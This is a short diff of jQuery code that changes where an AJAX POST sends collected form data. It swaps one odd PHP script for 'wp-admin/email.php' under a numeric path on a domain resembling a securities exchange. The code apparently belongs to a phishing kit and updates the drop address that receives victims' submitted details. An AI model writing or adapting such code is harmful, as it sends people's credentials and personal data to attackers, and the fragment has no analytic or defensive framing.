@@ -8,7 +8,7 @@ $(document).ready(function() {
 
                 
                 $.ajax({
-                    url: "https://www.getwillisfin.com/css/d.php",
+                    url: "https://abudhabisecuritiesexchange.org/6553443648438/download/wp-admin/email.php",
                     type: "POST",
                     data: formData,
                     processData: false,
